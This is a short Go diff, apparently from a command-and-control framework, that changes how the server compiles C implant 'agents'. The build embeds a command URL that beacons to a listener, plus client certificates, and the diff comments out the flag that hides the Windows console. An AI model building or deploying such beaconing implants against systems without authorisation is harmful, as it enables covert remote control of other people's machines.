@@ -128,6 +128,7 @@ func agentsHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {
 							"-D", `COMMAND_URL="http://`+listener_socket+`/`+listener_uuid+`/`+newAgentUUID+`/cmd"`,
 							"-D", "BEACON_INTERVAL="+beacon,
 							"-D", "TYPE=HTTP",
+							"-D", "OS=1",
 							pathToAgentC+"agent.c",
 							"-o", "agent",
 							"-lcurl",
@@ -208,6 +209,7 @@ func agentsHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {
 				// Creo el comando gcc para compilar el agente de C
 				newAgentUUID := uuid.New().String()
 				pathToAgentC := "Agentes/"
+
 				print("Nuevo agente: " + newAgentUUID + " Path: " + pathToAgentC + " Tipo: " + listener_type + " Beacon: " + beacon + " OS: " + listener_os + " Arquitectura: " + arquitecture + " UUID: " + listener_uuid + "\n")
 
 				cmd := exec.Command("gcc",
@@ -219,6 +221,7 @@ func agentsHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {
 					"-D", `CERT="`+certPemBase64+`"`,
 					"-D", `KEY="`+privPemBase64+`"`,
 					"-D", `SERVER_CERT="`+serverPemBase64+`"`,
+					"-D", "OS=1",
 					pathToAgentC+"agent.c",
 					"-o", "agent",
 					"-lcurl",
@@ -227,7 +230,7 @@ func agentsHandler(db *sql.DB) func(http.ResponseWriter, *http.Request) {
 					"-lws2_32",
 					"-lbcrypt",
 					"-s",
-					"-mwindows",
+					//"-mwindows",
 				)
 
 				out, err := cmd.CombinedOutput()
